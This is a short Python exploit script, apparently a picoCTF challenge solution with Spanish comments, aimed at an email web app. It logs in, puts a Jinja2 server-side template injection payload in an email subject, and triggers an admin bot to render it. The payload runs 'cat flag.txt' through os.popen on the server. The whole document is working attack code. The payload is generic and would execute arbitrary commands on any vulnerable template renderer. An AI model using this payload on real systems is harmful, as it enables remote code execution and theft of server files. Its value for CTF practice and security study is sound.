import requests

url = "http://activist-birds.picoctf.net:51700"

# 1. Obtenemos el token (el hash que recibes)
login_data = {"username": "user@ses", "password": "2f4167548ca5a3bdafc23ef1513cd9fd"}
response = requests.post(f"{url}/api/login", json=login_data)
token = response.json() # Este es el hash que recibes

# 2. Preparamos el payload SSTI
# Inyectamos en el subject para que sea renderizado por el admin_bot
payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}"

# 3. Enviamos el email usando el token en los encabezados
headers = {"Authorization": f"Bearer {token}"}
email_data = {
    "to": "admin@ses",
    "subject": payload,
    "body": "Check this out!"
}

# Enviamos el email
resp_send = requests.post(f"{url}/api/send", json=email_data, headers=headers)
print(f"Email sent, ID: {resp_send.text}")

# 4. Trigger al admin_bot
# Algunas implementaciones requieren que llames al bot tras enviar
requests.post(f"{url}/api/admin_bot", headers=headers)
